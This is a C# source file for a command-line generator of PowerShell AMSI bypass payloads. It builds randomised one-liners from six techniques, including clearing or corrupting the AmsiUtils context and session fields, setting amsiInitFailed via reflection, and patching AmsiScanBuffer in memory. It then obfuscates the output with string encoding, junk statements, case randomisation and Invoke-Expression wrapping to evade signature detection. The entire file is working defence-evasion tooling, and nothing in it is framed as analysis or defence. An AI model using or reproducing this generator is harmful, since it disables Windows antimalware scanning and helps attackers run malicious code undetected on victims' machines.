using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;

namespace AMSIBypass.CLI
{
    public class Generator
    {
        private static Random random = new Random();

        // ============================================================
        // Utilities
        // ============================================================

        public static int RandomInt(int max)
        {
            return random.Next(max);
        }

        public static int RandomRange(int min, int max)
        {
            return min + RandomInt(max - min);
        }

        public static string RandomCase(string input)
        {
            return new string(input.Select(c =>
                random.Next(2) == 0 ? char.ToUpper(c) : char.ToLower(c)
            ).ToArray());
        }

        public static string RandomString(int length)
        {
            const string first = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_";
            const string rest = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789";
            
            var sb = new StringBuilder(length);
            sb.Append(first[RandomInt(first.Length)]);
            for (int i = 1; i < length; i++)
            {
                sb.Append(rest[RandomInt(rest.Length)]);
            }
            return sb.ToString();
        }

        public static string RandomVarName()
        {
            return RandomString(RandomRange(4, 14));
        }

        public static string PickRandom<T>(T[] arr)
        {
            return arr[RandomInt(arr.Length)].ToString();
        }

        // ============================================================
        // Shared Helpers
        // ============================================================

        public static string GenAsmLookup(string vAsm, string vType, string vBf)
        {
            return $"${vAsm}=[AppDomain]::CurrentDomain.GetAssemblies()|Where-Object{{$_.Location -and $_.Location.EndsWith('System.Management.Automation.dll')}};" +
                   $"${vBf}=[System.Reflection.BindingFlags]'NonPublic,Static';" +
                   $"${vType}=${vAsm}.GetTypes()|Where-Object{{$_.Name -eq 'AmsiUtils'}};";
        }

        public static string GenNativeResolver(string vSysDll, string vUnsafe, string vLoadLib, string vGetProc)
        {
            return $"${vSysDll}=[AppDomain]::CurrentDomain.GetAssemblies()|Where-Object{{$_.Location -and $_.Location.EndsWith('System.dll')}};" +
                   $"${vUnsafe}=${vSysDll}.GetType('Microsoft.Win32.UnsafeNativeMethods');" +
                   $"${vLoadLib}=${vUnsafe}.GetMethod('LoadLibrary',[Type[]]@([String]));" +
                   $"${vGetProc}=${vUnsafe}.GetMethod('GetProcAddress',[Type[]]@([IntPtr],[String]));";
        }

        // ============================================================
        // Payload Data Structure
        // ============================================================

        public class PayloadData
        {
            public string Raw { get; set; }
            public string Technique { get; set; }
            public List<string> Variables { get; set; }
            public List<string> SensitiveStrings { get; set; }

            public PayloadData()
            {
                Variables = new List<string>();
                SensitiveStrings = new List<string>();
            }
        }

        // ============================================================
        // Techniques
        // ============================================================

        public static PayloadData GenerateForceError()
        {
            var vAsm = RandomVarName();
            var vType = RandomVarName();
            var vBf = RandomVarName();
            var vMem = RandomVarName();

            var raw = GenAsmLookup(vAsm, vType, vBf) +
                      $"${vMem}=[System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076);" +
                      $"[System.Runtime.InteropServices.Marshal]::Copy([byte[]]::new(9076),0,${vMem},9076);" +
                      $"${vType}.GetField('amsiSession',${vBf}).SetValue($null,$null);" +
                      $"${vType}.GetField('amsiContext',${vBf}).SetValue($null,[IntPtr]${vMem})";

            return new PayloadData
            {
                Raw = raw,
                Technique = "ForceError",
                Variables = new List<string> { $"${vAsm}", $"${vType}", $"${vBf}", $"${vMem}" },
                SensitiveStrings = new List<string> { "AmsiUtils", "amsiSession", "amsiContext" }
            };
        }

        public static PayloadData GenerateMattGRefl()
        {
            var vAsm = RandomVarName();
            var vType = RandomVarName();
            var vBf = RandomVarName();
            var vField = RandomVarName();

            var raw = GenAsmLookup(vAsm, vType, vBf) +
                      $"${vField}=${vType}.GetField('amsiInitFailed',${vBf});" +
                      $"${vField}.SetValue($null,$true)";

            return new PayloadData
            {
                Raw = raw,
                Technique = "MattGRefl",
                Variables = new List<string> { $"${vAsm}", $"${vType}", $"${vBf}", $"${vField}" },
                SensitiveStrings = new List<string> { "AmsiUtils", "amsiInitFailed" }
            };
        }

        public static PayloadData GenerateMattGReflLog()
        {
            var vAsm = RandomVarName();
            var vType = RandomVarName();
            var vBf = RandomVarName();
            var vDel = RandomVarName();
            var vField = RandomVarName();

            var raw = GenAsmLookup(vAsm, vType, vBf) +
                      $"${vDel}=[Delegate]::CreateDelegate([Func[String,[Reflection.BindingFlags],[Reflection.FieldInfo]]],[Object]${vType},'GetField');" +
                      $"${vField}=${vDel}.Invoke('amsiInitFailed',${vBf});" +
                      $"${vField}.SetValue($null,$true)";

            return new PayloadData
            {
                Raw = raw,
                Technique = "MattGReflLog",
                Variables = new List<string> { $"${vAsm}", $"${vType}", $"${vBf}", $"${vDel}", $"${vField}" },
                SensitiveStrings = new List<string> { "AmsiUtils", "amsiInitFailed" }
            };
        }

        public static PayloadData GenerateMattGRef02()
        {
            var vAsm = RandomVarName();
            var vType = RandomVarName();
            var vBf = RandomVarName();
            var vCtx = RandomVarName();
            var hexVal = "0x" + RandomInt(int.MaxValue).ToString("X");

            var raw = GenAsmLookup(vAsm, vType, vBf) +
                      $"${vCtx}=${vType}.GetField('amsiContext',${vBf}).GetValue($null);" +
                      $"[System.Runtime.InteropServices.Marshal]::WriteInt32(${vCtx},{hexVal})";

            return new PayloadData
            {
                Raw = raw,
                Technique = "MattGRef02",
                Variables = new List<string> { $"${vAsm}", $"${vType}", $"${vBf}", $"${vCtx}" },
                SensitiveStrings = new List<string> { "AmsiUtils", "amsiContext" }
            };
        }

        public static PayloadData GenerateRastaBuf()
        {
            var vSysDll = RandomVarName();
            var vUnsafe = RandomVarName();
            var vLoadLib = RandomVarName();
            var vGetProc = RandomVarName();
            var vLib = RandomVarName();
            var vAddr = RandomVarName();
            var vOld = RandomVarName();
            var vPatch = RandomVarName();
            var vK32 = RandomVarName();
            var vVpAddr = RandomVarName();
            var vVpDel = RandomVarName();
            var vRef = RandomVarName();

            var raw = GenNativeResolver(vSysDll, vUnsafe, vLoadLib, vGetProc) +
                      $"${vLib}=${vLoadLib}.Invoke($null,@('amsi.dll'));" +
                      $"${vAddr}=${vGetProc}.Invoke($null,@(${vLib},'AmsiScanBuffer'));" +
                      $"${vK32}=${vLoadLib}.Invoke($null,@('kernel32.dll'));" +
                      $"${vVpAddr}=${vGetProc}.Invoke($null,@(${vK32},'VirtualProtect'));" +
                      $"${vRef}=[UInt32].MakeByRefType();" +
                      $"${vVpDel}=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${vVpAddr},([type]'System.Func`5').MakeGenericType([IntPtr],[UInt32],[UInt32],${vRef},[Bool]));" +
                      $"${vOld}=[uint32]0;" +
                      $"${vVpDel}.Invoke(${vAddr},6,0x40,[ref]${vOld});" +
                      $"${vPatch}=[byte[]](0xB8,0x57,0x00,0x07,0x80,0xC3);" +
                      $"[System.Runtime.InteropServices.Marshal]::Copy(${vPatch},0,${vAddr},6)";

            return new PayloadData
            {
                Raw = raw,
                Technique = "RastaBuf",
                Variables = new List<string> { $"${vSysDll}", $"${vUnsafe}", $"${vLoadLib}", $"${vGetProc}", $"${vLib}", $"${vAddr}", $"${vOld}", $"${vPatch}", $"${vK32}", $"${vVpAddr}", $"${vVpDel}", $"${vRef}" },
                SensitiveStrings = new List<string> { "AmsiScanBuffer", "amsi.dll", "VirtualProtect", "UnsafeNativeMethods", "kernel32.dll" }
            };
        }

        public static PayloadData GenerateBlankAmsiProviders()
        {
            var vAsm = RandomVarName();
            var vType = RandomVarName();
            var vBf = RandomVarName();

            var raw = GenAsmLookup(vAsm, vType, vBf) +
                      $"${vType}.GetField('amsiContext',${vBf}).SetValue($null,[IntPtr]::Zero);" +
                      $"${vType}.GetField('amsiSession',${vBf}).SetValue($null,$null)";

            return new PayloadData
            {
                Raw = raw,
                Technique = "BlankAmsiProviders",
                Variables = new List<string> { $"${vAsm}", $"${vType}", $"${vBf}" },
                SensitiveStrings = new List<string> { "AmsiUtils", "amsiContext", "amsiSession" }
            };
        }

        // ============================================================
        // String Encoding Methods
        // ============================================================

        public static string ObfuscateInt(int num)
        {
            if (num <= 0) return $"({num})";
            if (num == 1) return PickRandom(new[] { "(1)", "(2-1)", "(3-2)" });
            if (num == 2) return PickRandom(new[] { "(2)", "(1+1)", "(4-2)" });

            int subNumber = RandomInt(num - 2) + 1;
            switch (RandomInt(6))
            {
                case 0: return $"({subNumber}+{num - subNumber})";
                case 1: return $"({num}+{subNumber}-{subNumber})";
                case 2: return $"({num}*{subNumber}/{subNumber})";
                case 3: return $"({num})";
                case 4:
                    {
                        int mask = RandomInt(65536);
                        return $"(0x{(num ^ mask):X} -bxor 0x{mask:X})";
                    }
                case 5:
                    {
                        double log2 = Math.Log(num, 2);
                        if (Math.Abs(log2 - Math.Floor(log2)) < 0.0001)
                            return $"(1 -shl {(int)log2})";
                        return $"({subNumber}+{num - subNumber})";
                    }
            }
            return $"({num})";
        }

        public static string CharEncodeAsChar(char c)
        {
            return $"[{RandomCase("char")}]{ObfuscateInt(c)}";
        }

        public static string CharEncodeAsByte(char c)
        {
            return $"([{RandomCase("byte")}]0x{((int)c):X})";
        }

        public static string EncodeStringChars(string str)
        {
            var parts = str.Select(c =>
                random.Next(2) == 0
                    ? CharEncodeAsChar(c)
                    : $"[{RandomCase("char")}]{CharEncodeAsByte(c)}"
            ).ToArray();

            if (parts.Length > 1) parts[0] = "[string]" + parts[0];
            return string.Join("+", parts);
        }

        private static readonly Dictionary<int, int[]> DiacriticMap = new Dictionary<int, int[]>
        {
            { 65, new[] { 192, 197 } },   // A
            { 97, new[] { 224, 229 } },   // a
            { 69, new[] { 200, 203 } },   // E
            { 101, new[] { 232, 235 } },  // e
            { 73, new[] { 204, 207 } },   // I
            { 105, new[] { 236, 239 } },  // i
            { 79, new[] { 210, 216 } },   // O
            { 111, new[] { 243, 246 } },  // o
            { 85, new[] { 217, 220 } },   // U
            { 117, new[] { 249, 252 } }   // u
        };

        public static string GetRandomDiacritic(int charCode)
        {
            if (DiacriticMap.TryGetValue(charCode, out int[] range))
            {
                return ((char)(range[0] + RandomInt(range[1] - range[0]))).ToString();
            }
            return ((char)charCode).ToString();
        }

        public static string EncodeStringDiacritic(string str)
        {
            var diacriticStr = new string(str.Select(c => GetRandomDiacritic(c)[0]).ToArray());
            var formD = EncodeStringChars("FormD");
            var pattern = EncodeStringChars(@"\p{Mn}");
            return $"('{diacriticStr}').{RandomCase("Normalize")}({formD}) -replace {pattern}";
        }

        public static string EncodeStringBytes(string str)
        {
            var bytes = str.Select(c => ObfuscateInt((int)c));
            return $"([{RandomCase("System.Text.Encoding")}]::ASCII.GetString([byte[]]({string.Join(",", bytes)})))";
        }

        public static string EncodeStringReverse(string str)
        {
            if (str.Contains("'")) return EncodeStringChars(str);
            var reversed = new string(str.Reverse().ToArray());
            var len = str.Length;
            return $"('{reversed}'[{ObfuscateInt(len - 1)}..0] -join '')";
        }

        public static string ObfuscateString(string str)
        {
            var methods = new Func<string, string>[]
            {
                EncodeStringChars,
                EncodeStringDiacritic,
                EncodeStringBytes,
                EncodeStringReverse
            };
            return methods[RandomInt(methods.Length)](str);
        }

        // ============================================================
        // Obfuscation Pipeline
        // ============================================================

        public static PayloadData VariableRenaming(PayloadData payload)
        {
            var newVars = new List<string>();
            var raw = payload.Raw;

            foreach (var v in payload.Variables)
            {
                var newName = "$" + RandomVarName();
                newVars.Add(newName);

                var bare = v.Substring(1);
                var newBare = newName.Substring(1);

                // Replace $var references
                var pattern = new Regex(@"\$" + Regex.Escape(bare) + @"\b");
                raw = pattern.Replace(raw, "$" + newBare);

                // Replace bare class name references
                var barePattern = new Regex(@"(?<!\$)\b" + Regex.Escape(bare) + @"\b");
                raw = barePattern.Replace(raw, newBare);
            }

            payload.Raw = raw;
            payload.Variables = newVars;
            return payload;
        }

        public static PayloadData SensitiveStringObfuscation(PayloadData payload)
        {
            var raw = payload.Raw;

            foreach (var word in payload.SensitiveStrings)
            {
                var obf = ObfuscateString(word);
                
                // Replace exactly-quoted occurrences
                raw = raw.Replace($"'{word}'", $"$({obf})");

                // Replace occurrences inside single-quoted strings
                var escaped = Regex.Escape(word);
                var matches = Regex.Matches(raw, escaped);
                var replacements = new List<(int start, int end)>();

                foreach (Match match in matches)
                {
                    var before = raw.Substring(0, match.Index);
                    var quotesBefore = before.Count(c => c == '\'');
                    if (quotesBefore % 2 == 1)
                    {
                        replacements.Add((match.Index, match.Index + word.Length));
                    }
                }

                for (int i = replacements.Count - 1; i >= 0; i--)
                {
                    var (start, end) = replacements[i];
                    raw = raw.Substring(0, start) + $"'+$({obf})+'" + raw.Substring(end);
                }
            }

            // Cleanup empty concatenations
            raw = raw.Replace("''+", "").Replace("+''", "");
            raw = Regex.Replace(raw, @"^''\+", "");
            raw = Regex.Replace(raw, @"\+''$", "");

            payload.Raw = raw;
            return payload;
        }

        public static PayloadData IntegerObfuscation(PayloadData payload)
        {
            var raw = payload.Raw;
            var pattern = new Regex(@"(?<=[\(,\s])(\d{2,})(?=[\),;\s\]])");

            raw = pattern.Replace(raw, match =>
            {
                var val = int.Parse(match.Value);
                return val <= 0 ? match.Value : ObfuscateInt(val);
            });

            payload.Raw = raw;
            return payload;
        }

        public static PayloadData JunkInsertion(PayloadData payload)
        {
            var raw = payload.Raw;
            var boundaries = new List<int>();

            for (int i = 0; i < raw.Length; i++)
            {
                if (raw[i] == ';')
                {
                    boundaries.Add(i);
                }
            }

            if (boundaries.Count < 2)
            {
                payload.Raw = raw;
                return payload;
            }

            int numInserts = RandomRange(2, Math.Min(5, boundaries.Count + 1));
            var chosen = new List<int>();

            for (int i = 0; i < numInserts && boundaries.Count > 0; i++)
            {
                int idx = RandomInt(boundaries.Count);
                chosen.Add(boundaries[idx]);
                boundaries.RemoveAt(idx);
            }

            chosen.Sort((a, b) => b.CompareTo(a));

            foreach (var pos in chosen)
            {
                string junk;
                switch (RandomInt(3))
                {
                    case 0:
                        {
                            var jVar = RandomVarName();
                            var jVal = RandomString(RandomRange(5, 20));
                            junk = $"${jVar}='{jVal}'";
                            break;
                        }
                    case 1:
                        junk = $"[{RandomCase("System.Threading.Thread")}]::Sleep({RandomInt(500)})";
                        break;
                    case 2:
                        {
                            var nopVar = RandomString(RandomRange(3, 10));
                            junk = $"[void]({RandomCase("Get-Variable")} -Name '{nopVar}' -ErrorAction SilentlyContinue)";
                            break;
                        }
                    default:
                        junk = "";
                        break;
                }
                raw = raw.Substring(0, pos + 1) + junk + ";" + raw.Substring(pos + 1);
            }

            payload.Raw = raw;
            return payload;
        }

        public static PayloadData CaseRandomization(PayloadData payload)
        {
            var raw = payload.Raw;
            var result = new StringBuilder();
            bool inStr = false;
            char strChar = '\0';

            for (int i = 0; i < raw.Length; i++)
            {
                char c = raw[i];

                if (inStr)
                {
                    result.Append(c);
                    if (c == strChar && (i == 0 || raw[i - 1] != '`'))
                    {
                        inStr = false;
                    }
                    continue;
                }

                if (c == '"' || c == '\'')
                {
                    inStr = true;
                    strChar = c;
                    result.Append(c);
                    continue;
                }

                if (char.IsLetter(c))
                {
                    result.Append(random.Next(2) == 0 ? char.ToUpper(c) : char.ToLower(c));
                }
                else
                {
                    result.Append(c);
                }
            }

            payload.Raw = result.ToString();
            return payload;
        }

        public static PayloadData ExpressionWrapping(PayloadData payload)
        {
            var raw = payload.Raw;

            switch (RandomInt(3))
            {
                case 0:
                    raw = $"& {{{raw}}}";
                    break;
                case 1:
                    {
                        var v = RandomVarName();
                        var escaped = raw.Replace("$", "`$").Replace("\"", "`\"");
                        raw = $"${v}=\"{escaped}\";{RandomCase("Invoke-Expression")} ${v}";
                        break;
                    }
                case 2:
                    break;
            }

            payload.Raw = raw;
            return payload;
        }

        // ============================================================
        // Public API
        // ============================================================

        public static string GetPayload()
        {
            // Select random technique
            var techniques = new Func<PayloadData>[]
            {
                GenerateForceError,
                GenerateMattGRefl,
                GenerateMattGReflLog,
                GenerateMattGRef02,
                GenerateRastaBuf,
                GenerateBlankAmsiProviders
            };

            var payload = techniques[RandomInt(techniques.Length)]();

            // Apply obfuscation pipeline
            payload = VariableRenaming(payload);
            payload = SensitiveStringObfuscation(payload);
            payload = IntegerObfuscation(payload);
            payload = JunkInsertion(payload);
            payload = CaseRandomization(payload);
            payload = ExpressionWrapping(payload);

            return payload.Raw;
        }
    }
}
